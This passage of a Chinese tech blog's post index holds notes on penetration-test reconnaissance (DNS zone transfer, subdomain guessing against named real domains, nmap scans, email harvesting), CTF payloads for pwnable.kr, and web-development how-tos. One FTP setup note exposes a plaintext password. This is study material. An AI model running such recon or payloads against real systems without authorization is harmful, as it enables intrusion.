//发请求到域名服务器要求列出子域名                                dig命令                          dig ns sda.gov.cn              dig axfr                                dnsenum –enum sda.gov.cn          fierce:域名猜测                          fierce -dns 163.com -wordlist dns-names.txt -threads 50 //同时起50个线程根据提供的字典猜测子域名              自带字典位置：/usr/share/fierce/hosts.txt              cat 163.com.dns.txt | awk -F'/t' '{printf\"%s\\t%s\\n\",$2,$1}' | sort //按照需求分割              awk文本处理工具 -F分割域              windows使用layer子域名查询机                                DNS域传送泄露（域名遍历）漏洞：DNS服务器不加确认就向对方提供域名数据库备份                    基于搜索引擎的信息探测                  google/baidu                          site:sjtu.edu.cn根据域名搜索              filetype:php 搜索PHP界面              inurl:login\t\turl中包括哪些关键词              intitile：\t\t//在网页标题中包含的              intext：\t\t\t//在内容中包含的              link                                Google Hacking Database 黑客搜索语句的数据库                          基于GHDB的SiteDigger                                theharvester -d hrw.org -b all //搜索邮件          maltego互联网情报收集平台，社工工具                          maltegoce              输入目标域名：Infrastructure -&gt;拖拽domain节点                                recon-ng                          use recon/domains-hosts/bing_domain_web              set source sjtu.edu.cn              数据库位置 /.recon-ng/workspaces/default              用火狐打开firefox resutl.html                                            主机信息收集          主机端口及服务                  Netbios文件共享服务 端口号135-139,445(windows专有)                    端口扫描                  常规扫描，三次握手。调用socket库中connect函数                          Nmap扫描器                                  TCP SYN扫描                                          扫描结果分为三种                                                  open\t\t开放的端口                          reset\t不提供服务的端口                          close\t防火墙过滤                                                                                                      TCP FIN扫描（误报很多）                                          没有回应\t开放端口                      RST重置\t不提供服务的端口                                                        使用libpcap                  -Pn 认定所有主机在线，跳过主机发现                  nmap -sP                   nmap -sT 172.16.1.1-254 -p 139,445 -Pn –open\t\t//-Pn不ping对方                  nmap 脚本位置： /usr/share/nmap/scripts                  nmap脚本类型 看一遍                                          auth: 负责处理认证证书(绕开认证)的脚本;                      broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务;                      brute: 提供暴力破解方式，针对常见的应用如http/snmp等;                      default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力;                      discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等;                      dos: 用于进行拒绝服务攻击;                      exploit: 利用已知的漏洞攻击系统;                      external: 利用第三方的数据库或资源，例如进行whois解析;                      fuzzer: 模糊测试，发送异常的包到目标机，探测潜在漏洞;                      intrusive: 带有入侵性，可能引发对方的IDS/IPS的记录或屏蔽;                      malware: 探测目标机是否感染了病毒、开启了后门等信息;                      safe: 与intrusive相反，属于安全性脚本;                      version: 增强服务与版本扫描(Version Detection)功能;                      vuln: 检查目标机是否有常见的漏洞(Vulnerability)，如MS08_067、MS17_010等。                      smb-vuln-ms17-010.nse  //永恒之蓝漏洞检测脚本                                                        nmap常规用法                                          nmap -sT(常规三次握手协议) -sS(SYN扫描) -Pn（扫描时不去ping对方）                      nmap –script=default -Pn                       nmap –script=smb-vuln* -Pn                       nmap -A -Pn 192.168.80.201  //综合性扫描-A                      nmap -sS -Pn -p 21-23,25,80,110,135- 139,143,443,445,1433,1521,3306,3389,5556,5631,5900,8080 192.168.80.1-254 –open   //扫描特定端口                                                        nmap图形化前端Zenmap                                            nc 172.16.1.201 80                                                      HEAD只回应头部数据，扫描时使用，可以得到旗标信息banner                      方法1：  HEAD / HTTP/1.1  HOST:172.16.1.201  方法2：  GET /HTTP/1.1  HOST:172.16.1.201                                                        nginx 顺序上服务器信息在前，日期在后                  apache 与nginx相反，日期信息在前，服务器信息在后                                                                                主机操作系统的探测   \t* nmap-os-db操作系统指纹数据库不断更新   \t* nmap -sS 172.16.1.201 -Pn -p 139,445,80 -O  //-O操作系统·   \t* -sT（发送ACK包） -sS（发送SYN包） -sV（根据开放端口获取系统信息） -Pn -p -O（搜索操作系统）            漏洞扫描                  CVE(Common Vulnerability Exposures)通用漏洞披露库: 设置漏洞编号          NVD(National Vulnerability Database): 多个CVE安全漏洞详细信息          Nessus: 综合性漏洞探测 （注册一波）                          扫描策略              扫描目标              扫描结果                                OpenVas kali自带，不好用                    Web漏洞探测                  w3af: Web Application Attack Framework          nikto                      局域网信息搜索          主机发现                  ICMP协议研究一波（存在ICMP广播风暴，使用已经过时）                          8字节，1个自己type，1个字节code              echo request 8 0              echo reply 0 0                                ARP，Address Resolution Protocol(链路层)：寻找哪个IP地址对应的Mac地址为目的地址，对应发送数据包                          ARP协议解析过程研究一波              IPv4(网络层)              数据包寻址通过Mac地址              ARP命令                                  -a                                                                        NetDiscover找局域网中存货主机      "
  },
  
  {
    "title": "阿里云ubuntu配置FTP服务器",
    "url": "/posts/%E9%98%BF%E9%87%8C%E4%BA%91ubuntu%E9%85%8D%E7%BD%AEFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/",
    "categories": "",
    "tags": "Website",
    "date": "2017-09-20 00:00:00 -0700",
    





    
    "snippet": "阿里云ubuntu配置FTP服务器FTP原理  主动FTP：          命令连接：客户端 &gt;1023端口 -&gt; 服务器 21端口      数据连接：客户端 &gt;1023端口 &lt;- 服务器 20端口        被动FTP：          命令连接：客户端 &gt;1023端口 -&gt; 服务器 21端口      数据连接：客户端 &gt;1023端口...",
    "content": "阿里云ubuntu配置FTP服务器FTP原理  主动FTP：          命令连接：客户端 &gt;1023端口 -&gt; 服务器 21端口      数据连接：客户端 &gt;1023端口 &lt;- 服务器 20端口        被动FTP：          命令连接：客户端 &gt;1023端口 -&gt; 服务器 21端口      数据连接：客户端 &gt;1023端口 -&gt; 服务器 &gt;1023端口      教程配置步骤  apt-get install vsftpd  ufw status //查看防火墙设置，用如下命令设置          sudo ufw allow 20/tcp\t\t//ftp端口      sudo ufw allow 21/tcp\t\t//ftp端口      sudo ufw allow 990/tcp\t//TLS端口      sudo ufw allow 40000:50000/tcp\t//设置配置文件      sudo ufw status        adduser dangyuan\t\t//pswd:dangyuan  设置fpt用户的主目录          sudo mkdir /home/dangyuan/ftp      sudo chown nobody:nogroup /home/dangyuan/ftp      sudo chmod a-w /home/dangyuan/ftp        设置可以上传文件的文件夹：          sudo mkdir /home/dangyuan/ftp/files      sudo chown dangyuan:dangyuan /home/dangyuan/ftp/files        测试文件                                                      echo “vsftpd test file”              sudo tee /home/dangyuan/ftp/files/test.txt                                            vi /etc/vsftpd.conf          write_enable=YES      chroot_local_user=YES      user_sub_token=$USER      local_root=/home/$USER/ftp      pasv_min_port=40000      pasv_max_port=50000      userlist_enable=YES      userlist_file=/etc/vsftpd.userlist      userlist_deny=NO      pam_service_name=ftp/svftpd //使用ftp服务或者sftp服务      chroot_local_user=YES      anon_root=/var/www/html/                                    echo “dangyuan”          sudo tee -a /etc/vsftpd.userlist                      systemctl restart vsftpd  测试ftp -p 101.132.100.213  设置防火墙          iptables -A INPUT -p tcp –dport 21 -j ACCEPT      iptables -A INPUT -p tcp –dport 20 -j ACCEPT      iptables -A INPUT -p tcp –dport 40000:50000 -j ACCEPT        遇到问题，测试抓包          tcpdump -n -i eth0 host 101.132.100.213 and 218.193.183.86      tcpdump host 101.132.100.213 and 218.193.183.86      ss -naltd      结论：ftp客户端需要设置为FTP被动模式        设置虚拟用户  apt-get install db_util  db_load -T -t hash -f /home/loguser.txt /etc/vsftpd_login.db  chmod 600 /etc/vsftpd_login.db  vi /etc/pam.d/vsftpd          加入文件开头两行      auth sufficient pam_userdb.so db=/etc/vsftpd_login      account sufficient pam_userdb.so db=/etc/vsftpd_login        值得注意的是，每次新增账号，需要在/etc/vsftpd.userlist中加入对应的用户名"
  },
  
  {
    "title": "laravel自学",
    "url": "/posts/laravel%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/",
    "categories": "",
    "tags": "Website",
    "date": "2017-07-30 00:00:00 -0700",
    





    
    "snippet": "2018-09-16: 感觉docker是更好的选择，找机会实验一下。7/30[推荐]使用Mac安装virtualbox+homestead配置laravel环境注：(一开始没注意到，虽然没有尝试过，但是目前感觉这个更适用)Valet只支持Mac，并且要求本地安装了PHP和数据库服务器，这可以通过使用Homebrew命令轻松实现核心思想：在virtualbox里运行homestead虚拟机，...",
    "content": "2018-09-16: 感觉docker是更好的选择，找机会实验一下。7/30[推荐]使用Mac安装virtualbox+homestead配置laravel环境注：(一开始没注意到，虽然没有尝试过，但是目前感觉这个更适用)Valet只支持Mac，并且要求本地安装了PHP和数据库服务器，这可以通过使用Homebrew命令轻松实现核心思想：在virtualbox里运行homestead虚拟机，并且使得虚拟机和主机共享一个文件夹，把laravel安装在这个文件夹里，使得配置和运行时在虚拟机里操作这个文件夹，在本机使用编辑器操作laravel里的文件。  安装homestead      用户名/密码：vagrant/vagrant    vagrant命令vagrant和homestead的理解：vagrant是一个管理虚拟机的工具。对于Mac的laravel/homestead官方文档来说，首先在根目录下安装homestead，相当于有一个总的虚拟机。每次新建项目时，现在总的虚拟机里对应文件夹下(如~/Code)新建laravel项目，然后composer require laravel/homestead –dev安装分别的虚拟机，实现每个项目单独一个环境。之后修改homestead.yaml文件以及hosts文件，完成整个新建项目的任务。\t1. 找到根目录下的homestead，vagrant up启动虚拟机。\t2. 在Code文件夹下laravel new blog新建一个项目\t3. composer require laravel/homestead --dev 安装项目自己的homestead\t4. 实现每个项目有单独的虚拟机启动 --------* vagrant up\t[vm-name]\t启动单虚拟机[特定虚拟机]* vagrant box add [box-name]\t增加镜像* vagrant box remove [box-name]\t删除镜像* vagrant reload\t重启* vagrant halt\t关闭* vagrant destroy\t销毁* vagrant snapshot save shot1\t快照* vagrant reload --provision 修改Homestead.yaml后重启并读取配置文件* 给每个项目安装不同的 Homestead 配置文件，直接安装至项目中*（每个项目分别有一个homestead）*\t* 新建项目： laravel new app \t* app路径下，虚拟机输入命令：composer require laravel/homestead --dev \t* 虚拟机：php vendor/bin/homestead make\t* /etc/hosts文件增加对应的IP地址和路由\t* 转换项目则在总的Homestead文件夹里homestead.yaml配置文件修改ip地址为对应的ip地址\t* 重启虚拟机：vagrant reload --provision* mysql端口、用户名密码：3306（33060）/homestead/secret\t* *注意：root用户的密码也是secret** SSH: 2222 → Forwards To 22* HTTP: 8000 → Forwards To 80* HTTPS: 44300 → Forwards To 443* MySQL: 33060 → Forwards To 3306* Postgres: 54320 → Forwards To 5432       nginx使用nginx应该是安装在homestead虚拟机里的，本机不需要安装。          查看是否启动： ps -ef|grep nginx      查看端口占有情况：netstat -ntpl      查看laravel版本(laravel文件目录下)：php artisan –version            正常操作          vagrant up      vagrant ssh      vagrant halt      生成auth模块：php artisan make:auth      7/31  新建laravel项目 composer 或者 laravel new blog  启动laravel服务器：php artisan serve      laravel文件夹结构          routes：路由情况      resources/views：界面            技巧          sublime：cmd+P–rweb-&gt;routes/web.php      一键建立表：php artisan migrate      8/1  composer dumpautoload 优化自动加载、提高效率      RESTFUL          create =&gt; post      read =&gt; get      update =&gt; put/patch      delete =&gt; delete        新建restful对象：php artisan make:controller UsersController  php artisan list make疑惑  composer create-project和laravel new的区别  在不同的项目里分别安装homestead，遇到部分配置按照总Homestead的，部分是独自的Homestead配置的情况，不太理解。  [已解决]php artisan miagre:refresh报错table exist；mysql数据库的migration表中没有对应新建的create_xxx_table项。不执行对应操作8/2  新建项目：          laravel new app      laravel new blog –dev(获取dev版)      composer create-project –prefer-dist laravel/laravel blog      rm -rf app (删除项目)        routes文件夹:web.php存储路径  新建mysql用户（权限似乎有点问题，无法修改mysql.user表）          create database blog;      grant all privileges on . to root@’%’ identified by ‘’;      insert into user(Host,User,authentication_string) values(‘localhost’,’root’,password(‘’));      grant usage on . to ‘root’@’%’ identified by ‘’ with grant option;        php artisan migrate将数据库的表格转移到新的数据库中      给予新的URI参数web.php：     Route::get('/', function () {     return view('welcome', [         'name' =&gt; 'world'  #return view('welcome')-&gt;with('name', 'worlld!');功能一致     ]); });            blade文件中可以直接使用@而不是&lt;?php ?&gt;在html中插入PHP代码     &lt;ul&gt;     @foreach ($tasks as $task)     &lt;li&gt;\\{\\{\\$task\\}\\}&lt;/li&gt;     @endforeach &lt;/ul&gt;            新建数据库表php artisan查看所有指令          php artisan make:migration create_tasks_table #新建在/database/migrations      修改生成的文件，使得数据库的表的要求适合自己的项目。注意要设置主键，或者用自带的id作为主键。      若删除了文件，可以使用composer dumpautoload重新配置，再使用第一步的命令继续。      编辑完输入php artisan migrate实现把命令对应到数据库中。      如果写错了 使用php artisan migrate:refresh回滚重新配置。      mysql使用当前时间 \\func now()，之间输入now()报错。      dd($id) dying dump 终止并输出；      print_r()      var_dump();die();            //删除文件夹下的所有 .git 文件find . -name \".git\" | xargs rm -Rf    mysql5.7.19新建用户  create user ‘test’@’%’ identified by ‘password’;\t#新建用户  grant all on test.* to ‘test’@’%’;\t#获得权利  Delete FROM user Where User=’test’ and Host=’localhost’; #删除用户  flush privileges;8/3  新建类：php artisan make:model Student  php artisan tinker 用来交互检查指令搜索数据库内容的测试shell \t* App\\Task::all() == DB::table(‘students’)-&gt;get(); \t* App\\Task::where(‘id’,’&gt;’,’3’)-&gt;get(); \t* App\\Task::pluck(‘body’); \t* 注意namespace的使用8/4      seeder自动填充数据到mysql数据库          php artisan make:seeder StudentTableSeeder #新建文件在databases/seeds/路径下      composer dumpautoload              修改StudentTableSeeder文件            for ($i=0; $i &lt; 10; $i++) {      DB::table('students')-&gt;insert([          // 'title'   =&gt; 'Title '.$i,          // 'slug'    =&gt; 'first-page',          // 'body'    =&gt; 'Body '.$i,          // 'user_id' =&gt; 1,          'student_id' =&gt; 'studnet'.$i,          'student_name' =&gt; 'student_name'.$i,          'class' =&gt; 'class'.$i,      ]);                    php artisan db:seed            设置api路径，访问时为IP/api/info     Route::get('info',function () {     $students = DB::table('students')-&gt;get();     return $students; });            遇到Vue通过axios访问laravel时Access-Control-Allow-Origin的问题，通过在后端增加插件laravel-cors解决（此问题针对laravel5.5版本）。具体问题可以深究一下。  9/11  注意修改阿里云控制台的安全组，让外网可以请求服务器。  完成ballot项目，配置服务器遇到问题。根据教程遇到问题502 NO Gateway。研究出新的方法：在ubunut中若服务器遇到问题，查看/var/log/nginx/error.log，看到具体报错问题。这次是/etc/nginx/sites-available/default配置文件中的fastcgi://unix:/var/run/php7.1-fpm.sock:位置错误，修改为fastcgi://unix:/var/run/php/php7.1-fpm.sock:解决问题。  If a new extension is needed to be used, do not forget to add the path in /config/app.php.  Use a laravel extension to optimize the picture  Minimize the font package size, Using the tools"
  },
  
  {
    "title": "CSS知识补充",
    "url": "/posts/CSS%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/",
    "categories": "",
    "tags": "Website",
    "date": "2017-07-12 00:00:00 -0700",
    





    
    "snippet": "2018/71.语法：选择题：{属性：值}  值为若干单词则加上双引号  多个申明分号分割2.属性：  font-family\t\t字体  font-style3.派生选择器将某元素属性单独设置即可li strong {\tfont-style: italic;\tfont-weight: normal;}4.id选择器#red {color:red;}用于建立派生选择器：#sidebar p {...",
    "content": "2018/71.语法：选择题：{属性：值}  值为若干单词则加上双引号  多个申明分号分割2.属性：  font-family\t\t字体  font-style3.派生选择器将某元素属性单独设置即可li strong {\tfont-style: italic;\tfont-weight: normal;}4.id选择器#red {color:red;}用于建立派生选择器：#sidebar p {\tfont-style: italic;\ttext-align: right;\tmargin-top: 0.5em;}5.类Class选择器.center {text-align: center}6.属性选择器[title]{color:red;}7.样式表      外部样式表      &lt;head&gt;  &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\" /&gt;  &lt;/head&gt;            内部样式表      &lt;head&gt;  &lt;style type=\"text/css\"&gt;    hr {color: sienna;}    p {margin-left: 20px;}    body {background-image: url(\"images/back40.gif\");}  &lt;/style&gt;  &lt;/head&gt;            内联样式      &lt;p style=\"color: sienna; margin-left: 20px\"&gt;  This is a paragraph  &lt;/p&gt;      8.背景  background-color: gray;\t\t背景颜色  background-image: url(/i/xx.gif);\t背景图片  background-repeat: repeat-x/y; \t\t横向/纵向平铺  background-position: top/bottom/left/right/center/50% 50%/50px 50px;\t\t\t背景位置  background-attachment:fixed\t\t\t背景在可视区固定9.文本  缩进文本(首行缩进)：\tp {text-indent: 5em/20%;} 百分比是相对于父元素的宽度而言  水平对齐：\t\ttext-align: left/right/center(只影响文本)/&lt;CENTER&gt;(还影响元素居中)/justify      字间隔/字母间隔：\t\tword-spacing/letter-spacing      p.tight {word-spacing: -0.5em;}  h1 {letter-spacing: -0.5em}  em:是网页浏览器的基础文本尺寸的高度        字符转换：text-transform:none/uppercase/lowercase/capitalize  文本装饰：text-decoration:none\\underline\\overline\\line-through\\blink  空白符： p {white-space: normal;}10.字体font-family:  五种通用字体：  Serif 字体  Sans-serif 字体  Monospace 字体  Cursive 字体  Fantasy 字体font-style:  三个值：  normal - 文本正常显示  italic - 文本斜体显示  oblique - 文本倾斜显示  字体变形：font-variant:  字体加粗：font-weight:normal(400)/bold/900(100~900)  字体大小：font-size:px/em/%11.链接  4种状态  a:link - 普通的、未被访问的链接  a:visited - 用户已访问的链接  a:hover - 鼠标指针位于链接的上方  a:active - 链接被点击的时刻a:link {color:#FF0000;}\t\t/* 未被访问的链接 */a:visited {color:#00FF00;}\t/* 已被访问的链接 */a:hover {color:#FF00FF;}\t/* 鼠标指针移动到链接上 */a:active {color:#0000FF;}\t/* 正在被点击的链接 */12.列表  列表类型 ul {list-style-type: square}  列表项图像 ul li {list-style-image: url(xxx.gif)}  列表标志位置 list-style-position:  简写列表样式 li {list-style : url(example.gif) square inside}13.表格html补充：tr一行、td一项      表格边框    table, th, td    {    border: 1px solid blue;    }        折叠边框：多边框或单边框      table    {    border-collapse:collapse;    }\t  table,th, td    {    border: 1px solid black;    }        表格文本对齐 text-align/vertical-align:水平/垂直对齐  表格内边距 padding:15px;14.轮廓outline-color/style/width15.调试通过Chrome的控制台设置CSS进行调试方便查看CSS变化。2019/1CSS Position: static/absolute/relative/fixed/sticky  static(default): The static postioned element will not be affected by the top, bottom, left, right properties.  relative: base on the normal position.  fixed: It is positioned relative to the viewport. It will stay in the same place while the page is scrolled.  absolute: It is positioned relative to the nearest ancestor. If it has no ancestor, it will take document body as an ancesotr.  sticky: It combines the relative and fixed."
  },
  
  {
    "title": "pwn自学",
    "url": "/posts/pwn%E8%87%AA%E5%AD%A6/",
    "categories": "",
    "tags": "CTF",
    "date": "2017-06-27 00:00:00 -0700",
    





    
    "snippet": "pwn      第一题     4660\tLETMEWIN            第二题  python -c \"print '\\x01' * 16 + '\\xe8' + '\\x05' + '\\xD9' + '\\x1d'\"      第三题cat &lt;(python -c \"print '\\xbe\\xba\\xfe\\xca' * 14\") - | nc pwnable.kr 9000  ...",
    "content": "pwn      第一题     4660\tLETMEWIN            第二题  python -c \"print '\\x01' * 16 + '\\xe8' + '\\x05' + '\\xD9' + '\\x1d'\"      第三题cat &lt;(python -c \"print '\\xbe\\xba\\xfe\\xca' * 14\") - | nc pwnable.kr 9000     cat flag            逆向的题目:         * file filename获得程序是x86还是x64的     * 使用strings filename | less 获得程序中字符串，判断是否加壳（使用upx）     * 通过upx -d filename脱壳      "
  },
  
  {
    "title": "iMoive自学",
    "url": "/posts/iMovie%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/",
    "categories": "",
    "tags": "Skills",
    "date": "2017-06-22 00:00:00 -0700",
    





    
    "snippet": "6/22入门教程：https://www.youtube.com/watch?v=UviYzKGFm4g总结  截取素材时，通过i和o选择截取片段的开头和结尾。  e键，选中素材片段后直接放入视频区  q键，选中素材片段放入原有视频前面，覆盖视频。  w键，选中素材片段放入视频区指定位置，切断原有的视频。  配音视频，先选择配音，把beats用m键标记，再根据标记截取素材。  裁剪-Ken ...",
    "content": "6/22入门教程：https://www.youtube.com/watch?v=UviYzKGFm4g总结  截取素材时，通过i和o选择截取片段的开头和结尾。  e键，选中素材片段后直接放入视频区  q键，选中素材片段放入原有视频前面，覆盖视频。  w键，选中素材片段放入视频区指定位置，切断原有的视频。  配音视频，先选择配音，把beats用m键标记，再根据标记截取素材。  裁剪-Ken Burns实现镜头在一个图像上移动。"
  },
  
  {
    "title": "Vue Framework",
    "url": "/posts/Vue_Framework/",
    "categories": "",
    "tags": "Website",
    "date": "2017-06-19 00:00:00 -0700",
    





    
    "snippet": "6/190. Little Research  vue-cli has some different templates such as webpack, webpack-simple and so on. Use vue list to list all available official templates. The useful template I used is wepack w...",
    "content": "6/190. Little Research  vue-cli has some different templates such as webpack, webpack-simple and so on. Use vue list to list all available official templates. The useful template I used is wepack which is a full-featured version.  vue upload module: First the file handle need to be caught and then submit the post type method to connnect the server.  I have used a plugin to offer a editor for users to upload bulletins. Tinymce. The tinymce-vue is not free so I use a intergrated editor from others on the Internet.1. MVVM模式Vue use MVVM model which means Model, View and Viewmodel. Model means data. View means UI and viewmodel means tha logic between them. View and viewmodel communicaates with each other by data binding. While viewmodel and model communicates with each other by notification.2. Vue.js Common commands  v-model: 在表单元素创建双向数据绑定&lt;input type=\"text\" v-model=\"message\"/&gt;  v-if: 条件渲染指令，可以通过布尔变量判断。&lt;h1 v-if=\"yes\"&gt;Yes!&lt;/h1&gt;  v-show: 只渲染css的style属性，这个标签会一直存在于DOM中，如果设置为false，只是样式会消失。  v-else: 跟在v-if/v-show之后。  v-for:渲染一个列表。可以使用template标签实现只循环里面的内容。v-for=\"(i,index) in character\"。  v-bind:argument=”expression”:argument可以是class、src等，参数可以使各种变量，通过绑定变量即时反应值得变化。  v-on:监听DOM事件，事件发生后通过帮顶一个方法或者内联语句实现调用。可以用@进行缩写。  v-html:用于插入一段纯HTML代码。  this          this.$refs可用于将      3.组件3.1 步骤  创建组件构造器Vue.extend()  注册组件Vue.component()  使用组件3.2 全局注册和局部注册全局注册：Vue.component()局部注册：只能在指定实例中使用new Vue({\tel: '#app',  \tcomponents: {   'my-component' : myComponent   }});3.3 父子组件var Parent = Vue.extend({// 在Parent组件内使用&lt;child-component&gt;标签\ttemplate :'&lt;p&gt;This is a Parent component&lt;/p&gt;&lt;child-component&gt;&lt;/child-component&gt;',   components: {// 局部注册Child组件，该组件只能在Parent组件内使用   'child-component': Child    }}) 3.4 组件注册语法糖简化过程：Vue.components第一个参数是标签名称，第二个参数是选项对象。这种方式将自动调用Vue.extend()。Vue.component('my-component1',{template: '&lt;div&gt;This is the first component!&lt;/div&gt;'})var vm1 = new Vue({ \tel: '#app1'})        3.5 使用propsprops把父组件的数据传递给子组件。  绑定类型          单项绑定：父组件修改传递给子组件，子组件修改不影响父组件      双向绑定.sync：子组件修改的数据会回传给父组件      单次绑定.once:父组件修改不影响子组件      7/7vue-cli是一个脚手架（即已经搭建好的框架，直接在对应文件里增加代码即可补充）。其中父组件是App.vue，里面分为template、script和style分别对应页面版面、数据结构（data）或组件（component）或函数（method）和CSS。其余子组件房子啊/scr/components文件夹下。      ESlint是QA（quality assurance）质量保证工具，用于避免低级错误和统一代码风格。如缩进空2格、函数名和括号之间空一格等。具体标准：https://github.com/standard/standard/blob/master/RULES.md#javascript-standard-style        组件应用模板     &lt;div id=\"app\"&gt;        \t\t\t  \t\t\t  \t\t\t\t  \t\t\t\t  \t\t\t  \t\t&lt;/div&gt;7/111.构造器拓展组件：var MyComponent = Vue.extend({  // 扩展选项})// 所有的 `MyComponent` 实例都将以预定义的扩展选项被创建var myComponentInstance = new MyComponent()The squence to start a vue project is from index.html-&gt;main.js-&gt;App.vue.2.属性与方法Vue实例：代理data属性、$data、$el、$watch3.实例生命周期4.计算属性  method和computed的区别：每次重新渲染method都会再次执行相关函数；computed计算属性依赖缓存。  watched和computed的区别：数据跟随其他数据变动时，watched是使用命令式函数回调，computed是则是构造通用函数，更加简洁。  计算属性有getter和setter5.Class和Style绑定  绑定HTML类：v-bind:class=”{}”  绑定内联样式：v-bind:style=”{}”6.条件渲染  v-if/v-else      复用元素：通过key使得变换placeholder时输入内容会删除      &lt;template v-if=\"loginType === 'username'\"&gt;    &lt;label&gt;Username&lt;/label&gt;    &lt;input placeholder=\"Enter your username\" key=\"username-input\"&gt;  &lt;/template&gt;  &lt;template v-else&gt;    &lt;label&gt;Email&lt;/label&gt;    &lt;input placeholder=\"Enter your email address\" key=\"email-input\"&gt;  &lt;/template&gt;        v-if/v-show：v-if是条件渲染，只在条件为真时才渲染；v-show总是渲染，只是通过CSS进行变换是否显示。7.列表渲染v-for：可选的第二参数作为当前项的索引\t&lt;ul id=\"example-2\"&gt;\t  &lt;li v-for=\"(item, index) in items\"&gt;\t     -  - \t  &lt;/li&gt;\t&lt;/ul&gt;数组更新检测，修改方法：  push()  pop()  shift()  unshift()  splice()  sort()  reverse()新旧数组替换：  filter()  concat()  slice()8.事件处理器:v-on:click      事件修饰符：      &lt;!-- 阻止单击事件冒泡 --&gt;  &lt;a v-on:click.stop=\"doThis\"&gt;&lt;/a&gt;  &lt;!-- 提交事件不再重载页面 --&gt;  &lt;form v-on:submit.prevent=\"onSubmit\"&gt;&lt;/form&gt;  &lt;!-- 修饰符可以串联  --&gt;  &lt;a v-on:click.stop.prevent=\"doThat\"&gt;&lt;/a&gt;  &lt;!-- 只有修饰符 --&gt;  &lt;form v-on:submit.prevent&gt;&lt;/form&gt;  &lt;!-- 添加事件侦听器时使用事件捕获模式 --&gt;  &lt;div v-on:click.capture=\"doThis\"&gt;...&lt;/div&gt;  &lt;!-- 只当事件在该元素本身（比如不是子元素）触发时触发回调 --&gt;  &lt;div v-on:click.self=\"doThat\"&gt;...&lt;/div&gt;            键值修饰符          .enter      .tab      .delete (捕获 “删除” 和 “退格” 键)      .esc      .space      .up      .down      .left      .right      9.表单控件绑定      文本      &lt;input v-model=\"message\" placeholder=\"edit me\"&gt;  &lt;p&gt;Message is: &lt;/p&gt;            多行文本      &lt;span&gt;Multiline message is:&lt;/span&gt;  &lt;p style=\"white-space: pre-line\"&gt;&lt;/p&gt;  &lt;br&gt;  &lt;textarea v-model=\"message\" placeholder=\"add multiple lines\"&gt;&lt;/textarea&gt;            复选框  HTML：\t&lt;input type=\"checkbox\" id=\"jack\" value=\"Jack\" v-model=\"checkedNames\"&gt;\t&lt;label for=\"jack\"&gt;Jack&lt;/label&gt;\t&lt;input type=\"checkbox\" id=\"john\" value=\"John\" v-model=\"checkedNames\"&gt;\t&lt;label for=\"john\"&gt;John&lt;/label&gt;\t&lt;input type=\"checkbox\" id=\"mike\" value=\"Mike\" v-model=\"checkedNames\"&gt;\t&lt;label for=\"mike\"&gt;Mike&lt;/label&gt;\t&lt;br&gt;\t&lt;span&gt;Checked names: &lt;/span&gt;JS：\tnew Vue({\t  el: '...',\t  data: {\t    checkedNames: []\t  }\t})  单选按钮  选择列表  详见：http://cn.vuejs.org/v2/guide/forms.html显示输出:console.log()组件  父组件通过 props 向下传递数据给子组件，子组件通过 events 给父组件发送消息。8/8  axios实现restful api  更新/安装vue库：npm install vue-loader  遇到axios文档中的例子不符合ES6标准，修改代码   const vm = this; // console.log(`ttt, ${this.$http.get('/api/info')}`); this.$http.get('/api/info') .then((res) =&gt; { vm.axios = res; }) .catch(err =&gt; console.log(err));  #修改config/index.jsproxyTable: {  '/api': {    target: 'http://192.168.10.10/',    changeOrigin: true  }}​  We can use style scoped to restrict the css to just set for the current component."
  },
  
  {
    "title": "从零开始学设计[日]北村崇",
    "url": "/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E8%AE%BE%E8%AE%A1/",
    "categories": "",
    "tags": "Design",
    "date": "2017-05-08 00:00:00 -0700",
    





    
    "snippet": "1.版式基础：靠近：关联性高的要素进行群组重复：要素的形式重复出现对比：要素大小以及先后次序的选择排齐：按照基准（等间隔、以一条线为基准）黄金比：1：1.618    更佳自然白银比：1：1.414  注：          反差率：标题越大，力量感越强      文字吸引力：加粗、改变颜色、加大、改变字体（强调的时候限定两种）      图片吸引力：加大、改变颜色、倾斜、改变形状（限定两种...",
    "content": "1.版式基础：靠近：关联性高的要素进行群组重复：要素的形式重复出现对比：要素大小以及先后次序的选择排齐：按照基准（等间隔、以一条线为基准）黄金比：1：1.618    更佳自然白银比：1：1.414  注：          反差率：标题越大，力量感越强      文字吸引力：加粗、改变颜色、加大、改变字体（强调的时候限定两种）      图片吸引力：加大、改变颜色、倾斜、改变形状（限定两种）      引导视线：Z形：F形：N形：日式，从右至左留白：减少图片占据的大小  注：          要素设置为同一系列或模式，可以让人们以此确认内容      用数字或箭头强制固定视线走法      加入图片，用人物照片，把文字加在人物视线处      版式的实践：  以黑白稿确定版式结构  改变照片的裁剪比例  灵活运用对称和非对称          对称图片，以中心线为轴，较有稳定感      非对称图片，整体对称，局部加上非对称素材，活泼      2.造型基础：  形状给人印象：          圆：温柔，圆满，孩子，快乐      四边形：安定、厚重、信赖      三角形：纤细、稳定、尖锐      设计造型：抽象化，用基本图形表示，使用黄金比和白银比图形和符号图形和文字配合使用，通俗易懂  根据符号特征的分类：行为符号、性质符号、视觉符号、抽象符号  根据符号内容的分类：时间的表现、地点的表现、人物的表现、对象的表现、行为的表现造型的实践  绘制图标  提取重要元素  着色提高对比度  调整尺寸创意训练（图标设计）：  根据一个主题，想出相关的事物，全部罗列出来。  把事物归类到时间、地点、人物、对象、表现中  根据关键词逆向思考关联的事物  选取与主题最接近的关键词，做成图标注：  注意错觉，英文字母LT横竖粗细不一样  人物造型的设计还要考虑重心不能太偏3.色彩的种类色彩的种类  光源色和物体色  光的三原色RGB  色料的三原色CMY（K）          Cyan 青      Megenta 洋红      Yellow 黄      配色  色相 Hue          补色 色相环对角线颜色      分裂颜色 一对二      三色配色      四色配色      主体色配色和主色调配色      基础色（背景）70%-主色（核心）25%-亮色（点缀）5%        明度 Brightness      纯度 Saturation    决定配色的方法          主色明度不太高，纯度不太低（推荐：蓝、红、橙）      基础色选择较浅、明度较高、纯度较低      亮色选择补色      增加配色：比例保持不变，同一种类型的色块可以选相近的颜色色彩的特性  醒目度          